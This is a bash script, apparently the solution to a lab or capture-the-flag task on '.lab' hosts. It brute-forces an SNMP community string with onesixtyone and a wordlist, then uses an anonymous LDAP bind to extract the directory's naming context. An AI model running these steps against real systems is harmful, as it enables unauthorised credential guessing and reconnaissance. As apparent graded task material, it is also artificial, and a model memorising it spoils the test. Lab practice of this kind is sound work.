#!/bin/bash

SNMP_TARGET="monitor.carmichael.lab"
LDAP_TARGET="directory.carmichael.lab"
WORDLIST="reference/communities.txt"

# 1. SNMP: Resolve target to IP and brute-force the community string.
# onesixtyone requires an IP, so we extract the IPv4 address first.
SNMP_IP=$(getent ahosts "$SNMP_TARGET" | awk '{print $1}' | head -n 1)

# Fallback resolution just in case getent fails
if [ -z "$SNMP_IP" ]; then
    SNMP_IP=$(ping -c 1 "$SNMP_TARGET" 2>/dev/null | awk -F'[()]' '/PING/{print $2}')
fi

# Run onesixtyone, filter for the successful line containing the community in brackets, and extract it.
COMMUNITY=$(onesixtyone -c "$WORDLIST" "$SNMP_IP" 2>/dev/null | grep '\[.*\]' | awk -F'[][]' '{print $2}' | head -n 1)

# 2. LDAP: Perform an anonymous bind to the Root DSE and extract the naming context.
# We query the base directory (-s base) with an empty base DN (-b "") asking for namingContexts.
BASEDN=$(ldapsearch -x -H "ldap://$LDAP_TARGET" -s base -b "" namingContexts 2>/dev/null | grep -i "^namingContexts:" | awk '{print $2}' | head -n 1)

# 3. Output exactly two non-empty lines
echo "$COMMUNITY"
echo "$BASEDN"
